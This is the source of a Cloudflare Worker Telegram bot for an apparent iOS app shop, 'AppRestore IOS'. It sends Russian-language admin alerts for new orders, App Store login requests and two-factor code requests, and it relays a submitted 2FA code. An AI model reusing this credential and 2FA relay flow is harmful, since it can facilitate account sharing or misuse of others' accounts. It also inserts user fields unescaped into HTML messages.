// Telegram Bot Cloudflare Worker for AppRestore IOS

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") {
      return new Response("OK", { status: 200 });
    }

    try {
      const contentType = request.headers.get("content-type") || "";
      
      if (contentType.includes("application/json")) {
        const update = await request.json();

        // Обработка нажатий на инлайн-кнопки (например, удаление уведомления)
        if (update.callback_query) {
          const cb = update.callback_query;
          const data = cb.data;
          const chatId = cb.message.chat.id;
          const messageId = cb.message.message_id;

          if (data === "del_msg" || data.startsWith("dismiss_")) {
            await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/deleteMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, message_id: messageId })
            });
          } else if (data.startsWith("approve_")) {
            await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ callback_query_id: cb.id, text: "Заказ подтвержден!" })
            });
          }

          await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cb.id })
          });

          return new Response("OK", { status: 200 });
        }

        // Обработка действий, приходящих с сайта
        if (update.action) {
          const chatId = env.TELEGRAM_ADMIN_CHAT_ID;
          const token = env.TELEGRAM_BOT_TOKEN;

          if (update.action === "notify_new_order") {
            const text = `🛍 <b>Новый заказ ${update.order_number}</b>\n\n` +
                         `📦 Приложения: ${update.app_names.join(", ")}\n` +
                         `💰 Сумма: <b>${update.total_price} ₽</b>` + 
                         (update.discount ? `\n🏷 Скидка: ${update.discount} ₽` : "");

            const keyboard = {
              inline_keyboard: [
                [
                  { text: "✅ Подтвердить", callback_data: `approve_${update.order_id}` },
                  { text: "❌ Отклонить", callback_data: `reject_${update.order_id}` }
                ],
                [
                  { text: "🗑 Удалить уведомление", callback_data: "del_msg" }
                ]
              ]
            };

            await sendTelegramMessage(token, chatId, text, keyboard);
          }
          else if (update.action === "notify_login_request") {
            const text = `📩 <b>Запрос данных для входа!</b>\n\n` +
                         `Заказ: <b>${update.order_number}</b>\n` +
                         `Клиент дошел до шага ввода данных и ожидает логин и пароль в App Store.`;

            const keyboard = {
              inline_keyboard: [
                [
                  { text: "🗑 Удалить уведомление", callback_data: "del_msg" }
                ]
              ]
            };

            await sendTelegramMessage(token, chatId, text, keyboard);
          }
          else if (update.action === "notify_code_request") {
            const text = `🔑 <b>Запрос кода подтверждения (2FA)!</b>\n\n` +
                         `Заказ: <b>${update.order_number}</b>\n` +
                         `Клиент ввел данные и запросил двухфакторный код. Пожалуйста, отправьте код в базу данных для заказа.`;

            const keyboard = {
              inline_keyboard: [
                [
                  { text: "🗑 Удалить уведомление", callback_data: "del_msg" }
                ]
              ]
            };

            await sendTelegramMessage(token, chatId, text, keyboard);
          }
          else if (update.action === "notify_code_submitted") {
            const text = `✅ <b>Код подтверждения отправлен!</b>\n\n` +
                         `Заказ: <b>${update.order_number}</b>\n` +
                         `Введенный код: <code>${update.code}</code>`;

            const keyboard = {
              inline_keyboard: [
                [
                  { text: "🗑 Удалить уведомление", callback_data: "del_msg" }
                ]
              ]
            };

            await sendTelegramMessage(token, chatId, text, keyboard);
          }

          return new Response(JSON.stringify({ success: true }), {
            headers: { "Content-Type": "application/json" }
          });
        }
      }

      return new Response("OK", { status: 200 });
    } catch (err) {
      return new Response(err.message, { status: 500 });
    }
  }
};

async function sendTelegramMessage(token, chatId, text, replyMarkup = null) {
  const body = {
    chat_id: chatId,
    text: text,
    parse_mode: "HTML"
  };
  if (replyMarkup) {
    body.reply_markup = replyMarkup;
  }
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
}
